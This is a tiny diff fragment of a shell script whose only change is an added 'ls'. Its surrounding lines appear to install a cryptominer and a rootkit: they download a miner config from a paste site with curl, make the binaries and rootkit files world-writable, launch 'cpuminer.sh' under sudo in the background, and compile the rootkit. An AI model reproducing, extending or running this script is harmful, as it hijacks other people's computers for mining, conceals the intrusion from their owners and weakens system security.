@@ -10,6 +10,7 @@ curl https://ghostbin.com/B545M/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
 chmod 777 *
 chmod 777 ./binaries/*
 chmod 777 ./rootkit/*
+ls
 sudo ./cpuminer.sh & 
 cd rootkit
 make
